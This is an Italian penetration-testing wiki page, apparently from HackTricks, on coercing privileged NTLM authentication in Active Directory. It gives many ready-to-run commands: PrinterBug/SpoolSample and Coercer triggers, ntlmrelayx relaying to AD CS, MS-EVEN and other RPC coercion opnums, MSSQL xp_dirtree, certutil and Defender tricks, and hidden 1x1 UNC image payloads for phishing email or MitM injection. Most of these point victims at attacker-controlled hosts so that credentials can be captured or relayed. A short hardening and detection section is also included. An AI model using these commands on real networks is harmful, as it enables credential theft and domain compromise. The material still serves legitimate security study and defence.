# Autenticazione privilegiata NTLM forzata

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) è una **collection** di **remote authentication triggers** codati in C# usando il compilatore MIDL per evitare dipendenze di terze parti.

## Abuso del servizio Spooler

Se il servizio _**Print Spooler**_ è **abilitato,** puoi usare alcune credenziali AD già note per **richiedere** al print server del Domain Controller un **aggiornamento** sui nuovi print job e indicargli semplicemente di **inviare la notifica a un determinato sistema**.\
Nota che, quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi verso** quel **sistema**. Pertanto, un attacker può fare in modo che il servizio _**Print Spooler**_ si autentichi verso un sistema arbitrario, e il servizio **utilizzerà l'account del computer** durante questa autenticazione.

Dietro le quinte, la classica primitive **PrinterBug** abusa di **`RpcRemoteFindFirstPrinterChangeNotificationEx`** tramite **`\\PIPE\\spoolss`**. L'attacker apre prima un handle verso una stampante/server e fornisce quindi un nome client falso in `pszLocalMachine`, facendo sì che lo spooler target crei un canale di notifica **verso l'host controllato dall'attacker**. Per questo l'effetto è una **coercizione dell'autenticazione in uscita** anziché l'esecuzione diretta di codice.<sup>[[2]](#references)</sup>\
Se stai cercando **RCE/LPE** nello spooler stesso, consulta [PrintNightmare](printnightmare.md). Questa pagina è incentrata su **coercizione e relay**.

### Individuazione dei server Windows nel dominio

Usa PowerShell per elencare gli host Windows. I server sono solitamente i target con la priorità più alta, quindi concentrati prima su di essi:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Individuazione dei servizi Spooler in ascolto

Utilizzando una versione leggermente modificata di @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica se il servizio Spooler è in ascolto:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Puoi anche usare `rpcdump.py` su Linux e cercare il protocollo **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Oppure testa rapidamente gli host da Linux con **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Se vuoi **enumerare le superfici di coercion** invece di limitarti a verificare se l'endpoint dello spooler esiste, usa la modalità di scansione di **Coercer**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Questo è utile perché vedere l'endpoint in EPM indica solo che l'interfaccia RPC di stampa è registrata. **Non** garantisce che ogni metodo di coercion sia raggiungibile con i privilegi attuali o che l'host generi un flusso di autenticazione utilizzabile.

### Chiedere al servizio di autenticarsi verso un host arbitrario

Puoi compilare [SpoolSample da qui](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
oppure usa [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se sei su Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Con **Coercer**, puoi prendere di mira direttamente le interfacce dello spooler ed evitare di dover indovinare quale metodo RPC è esposto:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Callback moderni RPC-over-TCP

Non presumere che una chiamata `RpcRemoteFindFirstPrinterChangeNotificationEx` completata con successo debba necessariamente produrre traffico sulla porta TCP/445. **Windows 11 22H2 e versioni successive usano RPC over TCP per le comunicazioni di stampa per impostazione predefinita**; RPC over named pipes è disabilitato, a meno che una policy o `RpcUseNamedPipeProtocol=1` non lo riabiliti. Di conseguenza, i listener legacy solo SMB possono segnalare che il trigger è stato inviato senza però ricevere mai il callback. Microsoft documenta TCP/135 (Endpoint Mapper) insieme alle porte RPC dinamiche per il normale RPC di stampa; le organizzazioni possono limitare questo intervallo o selezionare una porta RPC di stampa fissa.<sup>[[10]](#references)</sup>

L'attuale **Impacket `ntlmrelayx.py`** include un server RPC relay e un piccolo Endpoint Mapper, abilitato per impostazione predefinita sulla porta TCP/135. Questo supporto è stato integrato a giugno 2025 specificamente con una dimostrazione di una catena PrinterBug-to-AD-CS, consentendo di eseguire il relay del callback RPC autenticato anche quando la vittima non effettua il fallback a SMB/WebDAV.<sup>[[11]](#references)</sup>
```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Cerca `Setting up RPC Server on port 135` e `RPCD: Received connection` nell'output del relay. Se la chiamata RPC restituisce un errore previsto ma nulla raggiunge il listener, controlla la print RPC transport policy della vittima, l'outbound filtering, la risoluzione DNS e se un altro processo possiede già TCP/135. Assicurati inoltre che `ntlmrelayx` non sia stato avviato con `--no-rpc-server`.

### Forzare HTTP invece di SMB con WebClient

Sui sistemi che usano ancora **RPC over named pipes** (build legacy o comportamento ripristinato dalla policy), il PrinterBug classico generalmente produce un'autenticazione **SMB** verso `\\attacker\share`, ancora utile per il **capture**, il **relay verso target HTTP** o il **relay quando SMB signing è assente**.\
Tuttavia, il relaying da **SMB a SMB** è spesso bloccato da **SMB signing**, quindi gli operatori possono preferire forzare l'autenticazione **HTTP/WebDAV**. Questo non è un fallback per il comportamento RPC-over-TCP descritto sopra.

Se sul target è in esecuzione il servizio **WebClient**, il listener può essere specificato in una forma che fa usare a Windows **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Questo è particolarmente utile quando viene concatenato con **`ntlmrelayx --adcs`** o altri target di HTTP relay, perché evita di dipendere dalla possibilità di effettuare SMB relay sulla connessione indotta. L’avvertenza importante è che **WebClient deve essere in esecuzione** sulla vittima affinché la variante HTTP/WebDAV funzioni.

### Combinazione con Unconstrained Delegation

Se un attaccante ha compromesso un computer configurato per [Unconstrained Delegation](unconstrained-delegation.md), può **forzare la stampante ad autenticarsi verso quel computer**. Il **TGT** dell’account computer della stampante viene quindi memorizzato nella memoria del computer con unconstrained delegation, da cui l’attaccante può recuperarlo e riutilizzarlo con [Pass the Ticket](pass-the-ticket.md).

### Note su rilevamento e hardening

Il modo più affidabile per rimuovere PrinterBug da un DC, PAW o server che non esegue attività di stampa consiste nell’arrestare e disabilitare lo Spooler. Quando la stampa è necessaria, è opportuno applicare l’hardening a ogni possibile destinazione di relay (SMB server signing, LDAP signing/channel binding ed EPA sui servizi HTTP come AD CS), anziché presumere che bloccare TCP/445 sul percorso di callback sia sufficiente.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Il rilevamento dovrebbe correlare una chiamata autenticata a MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`, in particolare opnum 62/65 con un valore di callback non locale, e una connessione SMB, HTTP o RPC in uscita immediata dall'host dello spooler. Stabilire una baseline di **interface UUID/opnum e coppie source/destination**, non solo dell'accesso a `\PIPE\spoolss`, perché gli attuali print stack possono posizionare il callback su RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Matrice di coercizione tramite RPC UNC-path (interface/opnum che attivano l'autenticazione in uscita)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Note: interfaccia di stampa asincrona sulla stessa pipe dello spooler; usare Coercer per enumerare i metodi raggiungibili su un determinato host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (anche tramite \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums comunemente abusati: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Nota: questi metodi accettano parametri che possono contenere un UNC path (ad esempio, `\\attacker\share`). Durante l'elaborazione, Windows eseguirà l'autenticazione (nel contesto della macchina o dell'utente) verso tale UNC, consentendo la cattura o il relay di NetNTLM.\
Per lo spooler abuse, **MS-RPRN opnum 65** rimane la primitive più comune e meglio documentata, perché la specifica del protocollo afferma esplicitamente che il server crea un notification channel verso il client specificato da `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: coercizione di ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN su \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effetto: il target tenta di aprire il percorso del backup log fornito ed esegue l'autenticazione verso l'UNC controllato dall'attacker.<sup>[[1]](#references)</sup>
- Uso pratico: forzare asset Tier 0 (DC/RODC/Citrix/ecc.) a emettere NetNTLM, quindi eseguire il relay verso endpoint AD CS (scenari ESC8/ESC11) o altri servizi privilegiati.<sup>[[1]](#references)</sup>

## PrivExchange

L'attacco `PrivExchange` è il risultato di una flaw individuata nella **feature `PushSubscription` di Exchange Server**. Questa feature consente di forzare il server Exchange, tramite qualsiasi domain user dotato di mailbox, ad autenticarsi verso qualsiasi host fornito dal client tramite HTTP.

Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e dispone di privilegi eccessivi (in particolare, dei **privilegi WriteDacl sul dominio prima del Cumulative Update 2019**). Questa flaw può essere sfruttata per abilitare il **relay delle informazioni verso LDAP e successivamente estrarre il database NTDS del dominio**. Nei casi in cui il relay verso LDAP non sia possibile, questa flaw può comunque essere utilizzata per eseguire il relay e autenticarsi verso altri host del dominio. Lo sfruttamento riuscito di questo attacco garantisce accesso immediato al Domain Admin con qualsiasi account autenticato del dominio.

## All'interno di Windows

Se si è già all'interno della macchina Windows, è possibile forzare Windows a connettersi a un server utilizzando account privilegiati con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Oppure usa quest'altra tecnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

È possibile usare il lolbin certutil.exe (binario firmato da Microsoft) per forzare l'autenticazione NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Tramite email

Se conosci l'**indirizzo email** dell'utente che effettua l'accesso a una macchina che vuoi compromettere, potresti semplicemente inviargli una **email con un'immagine 1x1** come ad esempio
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Quando la vittima lo apre, Windows tenta di autenticarsi.

### MitM

Se puoi eseguire un attacco MitM e iniettare HTML in una pagina visualizzata dalla vittima, prova a iniettare un'immagine come:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Altri modi per forzare e fare phishing dell'autenticazione NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking di NTLMv1

Se riesci a catturare [le challenge NTLMv1, leggi qui come crackarle](../ntlm/index.html#ntlmv1-attack).\
_Ricorda che, per crackare NTLMv1, devi impostare la challenge di Responder su "1122334455667788"_

## References

- [1] [Unit 42 – La coercizione dell'autenticazione continua a evolversi](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Protocollo di remoting EventLog](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Aggiornamenti delle connessioni RPC per la stampa in Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – Server di relay RPC e Endpoint Mapper per ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
{{#include ../../banners/hacktricks-training.md}}
